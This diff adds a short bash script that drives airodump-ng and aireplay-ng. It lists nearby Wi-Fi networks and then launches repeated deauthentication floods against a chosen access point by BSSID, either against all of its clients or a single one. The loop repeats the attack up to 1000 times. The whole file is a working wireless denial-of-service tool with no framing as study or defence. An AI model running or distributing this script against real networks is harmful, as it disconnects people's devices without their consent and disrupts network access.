@@ -1,0 +1,26 @@
+#!/bin/bash
+
+int=wlp3s0
+ch=$3
+
+function deauthe(){
+	echo $ch $int
+	airodump-ng -c $ch $int
+	for i in {0..1000}
+	do
+	  aireplay-ng $*
+	done
+}
+
+if [[ $1 == "list" ]] ; then
+	if [[ $2 ]] ; then
+		airodump-ng --bssid $2 $int
+	else
+		airodump-ng $int
+	fi
+elif [[ $1 == "all" ]] ; then
+	deauthe --ignore-negative-one -0 0 -a $2 $int
+else
+	deauthe -0 0 -a $1 -c $2 $int
+fi
+
